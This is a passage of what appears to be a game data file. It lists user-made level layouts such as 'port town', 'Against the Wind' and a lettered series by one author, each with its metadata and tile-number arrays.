,90,1,0,1,114,114,1,106,106,5,1,0,1,14,14,29,1,1,1,1,1,1,0,1,113,113,1,107,107,25,1,0,1,14,14,0,1,0,0,0,0,0,0,1,112,112,1,108,108,0,1,0,1,14,14,28,1,0,0,0,0,0,0,1,111,111,110,109,109,25,1,0,1,14,14,0,1,1,1,1,1,1,1,1,110,110,110,110,110,0,1,0,1,14,14,27,1,1,1,1,1,1,1,1,1,1,1,1,1,26,1,0,1,14,14,27,27,0,27,27,0,27,27,0,26,0,26,0,26,26,1,0,1,14,14,27,27,0,27,27,0,27,27,0,26,0,25,0,25,26,1,0,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0]});
maps.push({name="baguette factory v2",author="alli",id="#1672357439",direction="forward",cost=220,elevation=0,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,5,5,5,5,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,105,105,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,1,1,1,9998,9998,9998,9998,9998,9998,1,1,1,0,0,0,0,0,0,0,1,94,8,0,6,6,6,6,6,9998,148,8,8,1,0,0,0,0,0,0,0,1,1,1,9998,9998,9998,9998,9998,9998,1,1,1,0,0,0,0,0,0,0,0,0,1,110,5,5,5,5,5,5,110,1,0,0,0,0,0,0,0,0,0,1,1,1,9998,9998,9998,9998,9998,9998,1,1,1,0,0,0,0,0,0,0,1,12,12,148,9998,6,6,6,6,6,0,12,94,1,0,0,0,0,0,0,0,1,1,1,9998,9998,9998,9998,9998,9998,1,1,1,0,0,0,0,0,0,0,0,0,1,114,5,5,5,5,5,5,114,1,0,0,0,0,0,0,0,0,0,1,1,1,9998,9998,9998,9998,9998,9998,1,1,1,0,0,0,0,0,0,0,1,16,16,0,6,6,6,6,6,9998,148,16,16,1,0,0,0,0,0,0,0,1,1,1,9998,9998,9998,9998,9998,9998,1,1,1,0,0,0,0,0,0,0,1,118,118,118,5,5,5,5,5,5,118,118,118,1,0,0,0,0,0,0,1,93,93,93,65,5,5,5,5,65,93,93,93,1,0,0,0,0,0,0,0,1,1,1,1,1,105,105,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,95,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0]});
maps.push({name="duo win",author="VarunFuego",id="#1672357957",direction="forward",cost=425,elevation=0,map=[25,25,25,25,25,25,25,25,25,2,2,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,26,26,26,26,26,26,26,26,26,26,26,26,26,26,26,26,25,25,25,25,26,27,27,27,27,27,27,27,27,27,27,27,27,27,27,26,25,25,25,25,26,27,28,28,28,28,28,28,28,28,28,28,28,28,27,26,25,25,25,25,26,27,28,72,73,73,73,29,29,72,73,73,73,28,27,26,25,25,25,25,26,27,28,72,0,0,71,30,30,72,0,0,71,28,27,26,25,25,25,25,26,27,28,72,0,0,71,31,31,72,0,0,71,28,27,26,25,25,25,25,26,27,28,74,74,74,71,32,32,74,74,74,71,28,27,26,25,25,25,25,39,39,38,37,36,35,34,33,33,34,35,36,37,38,39,39,25,25,25,25,39,39,38,37,36,35,34,33,33,34,35,36,37,38,39,39,25,25,25,25,40,40,1,1,1,1,1,44,44,1,1,1,1,1,40,40,25,25,25,25,40,40,1,0,0,0,1,100,44,1,0,0,0,1,40,40,25,25,25,25,41,41,1,0,0,1,1,44,44,1,1,0,0,1,41,41,25,25,0,0,97,41,1,1,1,0,0,0,0,0,0,1,1,1,96,96,0,0,25,25,42,42,43,44,44,98,44,44,44,44,98,99,44,43,42,42,25,25,25,25,42,42,43,44,44,98,44,44,44,44,98,44,44,43,42,42,25,25,25,25,0,0,0,0,0,0,0,43,43,0,0,0,0,0,0,0,25,25,25,25,25,25,25,25,25,25,66,66,66,66,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,2,2,25,25,25,25,25,25,25,25,25]});
maps.push({name="port town",author="alli",id="#1672373039",direction="left",cost=246,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,6,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9998,6,6,6,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,9998,6,6,1,1,93,24,0,0,0,0,0,0,0,0,0,0,0,0,7,9998,6,6,1,1,93,24,3,189,0,0,0,0,0,0,0,0,0,0,7,9998,6,90,1,1,93,24,0,5,0,189,0,0,0,0,0,0,0,0,7,9998,6,6,1,1,93,24,0,3,0,5,0,189,0,0,0,0,0,0,7,9998,6,6,1,1,0,0,0,0,0,3,0,5,0,189,0,0,0,0,7,9998,6,90,1,1,0,0,0,0,0,0,0,3,0,5,0,189,0,0,9998,6,6,6,1,1,100,0,0,0,0,0,0,0,0,3,0,5,0,0,8,6,6,6,1,1,20,0,0,0,0,0,0,0,0,0,0,3,0,5,9998,6,6,90,1,1,0,0,0,0,0,0,0,0,0,0,0,0,5,9998,6,6,6,6,1,1,0,0,0,0,0,0,0,0,0,0,0,5,9998,6,6,6,6,6,1,1,20,8,9998,7,7,7,7,7,7,9998,8,9998,6,6,6,6,6,1,0,1,20,6,6,9998,9998,9998,9998,9998,9998,6,6,6,6,6,6,6,90,1,0,2,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,1,0,0,2,6,6,6,90,6,6,6,90,6,6,6,90,3,6,90,1,0,0,153,1,20,65,65,20,20,6,6,20,20,6,6,20,20,6,1,0,0,187,5,1,20,65,65,20,20,6,94,20,20,6,94,20,20,1,0,0,0,0,154,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,157]});
maps.push({name="Against the Wind",author="sivi",id="#1672406408",direction="right",cost=466,elevation=0,map=[0,1,1,1,1,1,1,1,1,1,1,2,2,1,1,0,0,0,0,0,0,1,127,127,128,128,128,128,128,1,90,114,114,90,1,0,0,0,0,0,0,1,127,127,128,128,128,128,128,1,114,114,114,114,1,0,0,0,0,0,0,1,127,127,1,1,1,126,126,1,88,114,114,94,1,0,0,0,0,0,0,1,127,127,1,0,1,126,126,1,114,114,114,114,1,0,0,0,0,0,0,1,127,127,1,1,1,126,126,1,90,114,114,90,1,0,0,0,0,0,0,1,127,127,1,90,14,14,90,199,114,114,114,114,1,0,0,0,0,0,0,1,127,127,1,14,14,14,93,199,114,114,114,114,1,0,0,0,0,0,0,1,127,127,1,131,14,14,93,199,114,114,114,90,1,0,0,0,0,0,0,1,127,127,1,14,14,14,93,199,114,114,114,114,1,1,1,1,1,1,0,1,127,127,1,90,14,14,90,199,114,114,114,114,1,90,114,114,90,1,0,1,127,127,1,1,1,1,1,1,90,114,114,90,1,114,114,114,114,2,0,1,127,127,1,0,0,0,0,1,114,114,114,114,1,114,114,114,114,2,0,1,127,127,1,0,0,0,0,1,88,114,114,94,1,90,114,114,90,1,0,1,127,127,1,0,0,0,0,1,114,114,114,114,1,1,95,95,1,1,0,1,127,127,1,1,1,1,1,1,90,114,114,90,1,90,114,114,90,1,0,1,129,129,129,129,129,14,14,114,114,114,114,114,95,114,114,114,132,1,0,1,129,129,129,129,129,14,14,114,114,114,114,114,95,114,114,114,132,1,0,1,1,1,1,1,1,1,1,1,90,114,114,90,1,90,114,114,90,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Threeway",author="sivi",id="#1672406951",direction="forward",cost=308,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,5,5,0,14,14,14,14,14,14,0,0,0,14,14,90,9,9,90,9,141,5,5,141,9,90,9,9,90,14,14,0,14,14,9,9,9,9,9,9,141,5,5,141,9,9,9,9,9,9,14,14,14,90,9,140,0,0,0,0,0,5,5,0,0,0,0,0,140,9,90,14,14,9,9,0,0,0,0,0,0,5,5,0,0,0,0,0,0,9,9,14,14,9,9,0,0,0,0,0,0,5,5,0,0,0,0,0,0,9,9,14,14,90,9,0,33,90,0,0,90,5,5,90,0,0,90,33,0,9,90,14,14,9,9,0,33,94,0,90,5,5,5,5,90,0,93,33,0,9,9,14,14,9,9,0,33,94,0,88,5,5,5,5,88,0,93,33,0,9,9,14,14,90,9,0,33,90,0,90,5,5,5,5,90,0,90,33,0,9,90,14,14,9,9,0,33,93,0,88,5,5,5,5,88,0,94,33,0,9,9,14,14,9,9,0,33,93,0,90,5,5,5,5,90,0,94,33,0,9,9,14,14,90,9,0,33,90,0,0,90,5,5,90,0,0,90,33,0,9,90,14,14,9,9,0,0,0,0,0,0,5,5,0,0,0,0,0,0,9,9,14,14,9,9,0,0,0,0,0,0,5,5,0,0,0,0,0,0,9,9,14,14,90,9,140,0,0,0,0,0,5,5,0,0,0,0,0,140,9,90,14,14,14,9,9,9,9,9,9,0,5,5,0,9,9,9,9,9,9,14,14,0,14,14,90,9,9,90,9,0,5,5,0,9,90,9,9,90,14,14,0,0,0,14,14,14,14,14,14,0,2,2,0,14,14,14,14,14,14,0,0]});
maps.push({name="A",author="Escalope",id="#1672439748",direction="left",cost=185,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,94,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,2,5,93,5,5,5,5,5,5,5,5,5,5,5,5,5,5,100,5,0,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="B",author="Escalope",id="#1672439777",direction="left",cost=218,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,94,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,5,5,5,0,0,5,5,5,5,5,5,5,5,5,0,5,5,5,5,5,5,5,5,0,2,5,93,5,5,5,5,5,5,5,0,5,5,5,5,5,5,100,5,0,2,5,5,5,5,5,5,5,5,5,0,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="D",author="Escalope",id="#1672439815",direction="left",cost=179,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,100,5,5,5,5,5,5,5,5,5,5,5,5,5,5,94,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,2,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,2,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,5,5,5,5,5,5,5,93,5,5,5,5,5,5,5,5,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="E",author="Escalope",id="#1672439845",direction="left",cost=245,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,2,5,5,5,5,0,0,0,5,93,100,5,0,0,0,5,5,94,5,0,2,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="F",author="Escalope",id="#1672439892",direction="left",cost=185,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,94,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,93,100,5,0,0,0,0,0,0,0,0,2,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,2,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="G",author="Escalope",id="#1672439920",direction="left",cost=241,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,94,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,93,100,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,2,5,5,5,5,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,2,5,5,5,5,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="H",author="Escalope",id="#1672439957",direction="left",cost=189,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,93,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,94,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,100,5,0,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="I",author="Escalope",id="#1672439985",direction="left",cost=189,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,100,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,94,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,2,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,93,5,5,0,2,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="J",author="Escalope",id="#1672440005",direction="left",cost=169,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,5,100,93,5,0,0,0,0,0,0,0,0,5,5,5,5,94,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="K",author="Escalope",id="#1672440027",direction="left",cost=183,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,94,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,5,5,5,5,5,5,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,5,5,5,5,5,5,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,5,5,5,5,5,5,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,5,5,5,93,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,100,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,2,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="L",author="Escalope",id="#1672440047",direction="left",cost=133,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,94,5,5,0,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,93,100,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="M",author="Escalope",id="#1672440064",direction="left",cost=189,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,94,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,93,5,0,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,100,5,0,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
